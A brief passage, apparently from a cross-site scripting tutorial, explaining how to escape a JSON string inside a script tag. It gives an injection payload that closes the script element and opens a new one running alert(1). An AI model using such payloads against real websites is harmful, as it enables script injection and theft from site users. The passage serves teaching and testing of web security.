...
Same as DOM XSS, but the injection point is inside a JSON string within a script tag. Close the JSON and script context first, then inject JavaScript.
...
```
<script>
var data = {"username": "</script><script>alert(1)</script>"};
</script>
```
The </script> closes the existing tag, the new <script> runs the payload.
